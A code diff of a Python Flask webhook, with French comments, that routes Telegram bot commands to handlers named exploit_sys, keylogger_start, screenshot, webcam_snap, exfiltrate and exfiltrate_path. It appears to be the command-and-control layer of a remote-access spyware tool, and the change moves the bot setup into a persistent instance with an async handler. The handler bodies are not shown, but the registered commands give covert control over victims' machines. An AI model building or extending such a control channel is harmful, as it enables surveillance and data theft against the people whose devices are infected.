@@ -1,13 +1,15 @@
 import os
-import json
-from flask import Blueprint, request, abort
+import traceback
+from flask import Blueprint, request, Response
 from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler
+from telegram.ext import (
+    ApplicationBuilder, CommandHandler
+)
 
-# ✅ Import corrigé : utils.py est maintenant dans modules/
+# ✅ Import clés depuis utils
 from modules.utils import get_api_keys
 
-# ✅ Import stable des handlers Telegram
+# ✅ Commandes
 from telegram_bot.telegram_bot import (
     menu, osint, scan, exploit_sys,
     screenshot, keylogger_start,
@@ -15,43 +17,42 @@ from telegram_bot.telegram_bot import (
     rapport
 )
 
-# 🔐 Chargement des clés API
+# ✅ Récupération clés API
 api = get_api_keys()
 TOKEN = api.get("TELEGRAM_BOT_TOKEN")
 SECRET_TOKEN = api.get("TELEGRAM_SECRET_TOKEN")
 
-# ✅ Déclaration du Blueprint Flask
+# ✅ Création application persistante (à l’extérieur)
+application = ApplicationBuilder().token(TOKEN).build()
+
+# ✅ Ajout des handlers UNE SEULE FOIS
+application.add_handler(CommandHandler("menu", menu))
+application.add_handler(CommandHandler("osint", osint))
+application.add_handler(CommandHandler("scan", scan))
+application.add_handler(CommandHandler("exploit_sys", exploit_sys))
+application.add_handler(CommandHandler("screenshot", screenshot))
+application.add_handler(CommandHandler("keylogger_start", keylogger_start))
+application.add_handler(CommandHandler("webcam_snap", webcam_snap))
+application.add_handler(CommandHandler("exfiltrate", exfiltrate))
+application.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
+application.add_handler(CommandHandler("rapport", rapport))
+
+# ✅ Blueprint
 telegram_webhook = Blueprint("telegram_webhook", __name__)
 
-# ✅ ROUTE CORRIGÉE : ne pas redoubler /telegram ici
 @telegram_webhook.route("/webhook", methods=["POST"])
-def handle_webhook():
-    # ✅ Vérification du header secret pour sécuriser le webhook
-    header_token = request.headers.get("X-Telegram-Bot-Api-Secret-Token")
-    if SECRET_TOKEN and header_token != SECRET_TOKEN:
-        abort(403, description="⛔ Jeton secret invalide")
-
+async def handle_webhook():
     try:
-        data = request.get_json()
-        update = Update.de_json(data, ApplicationBuilder().token(TOKEN).build().bot)
+        if request.headers.get("X-Telegram-Bot-Api-Secret-Token") != SECRET_TOKEN:
+            return Response("Unauthorized", status=403)
 
-        # 🧠 Création d’une instance Telegram avec les handlers
-        app = ApplicationBuilder().token(TOKEN).build()
-        app.add_handler(CommandHandler("menu", menu))
-        app.add_handler(CommandHandler("osint", osint))
-        app.add_handler(CommandHandler("scan", scan))
-        app.add_handler(CommandHandler("exploit_sys", exploit_sys))
-        app.add_handler(CommandHandler("screenshot", screenshot))
-        app.add_handler(CommandHandler("keylogger_start", keylogger_start))
-        app.add_handler(CommandHandler("webcam_snap", webcam_snap))
-        app.add_handler(CommandHandler("exfiltrate", exfiltrate))
-        app.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
-        app.add_handler(CommandHandler("rapport", rapport))
+        update = Update.de_json(request.get_json(force=True), application.bot)
+        await application.update_queue.put(update)
 
-        # ⚙️ Traitement de la requête entrante
-        app.update_queue.put_nowait(update)
-
-        return {"status": "ok"}
+        print("✅ Webhook Telegram traité avec succès.")
+        return Response("OK", status=200)
 
     except Exception as e:
-        abort(500, description=f"❌ Erreur webhook : {str(e)}")
+        print("❌ Erreur webhook :", str(e))
+        traceback.print_exc()
+        return Response("Erreur serveur", status=500)
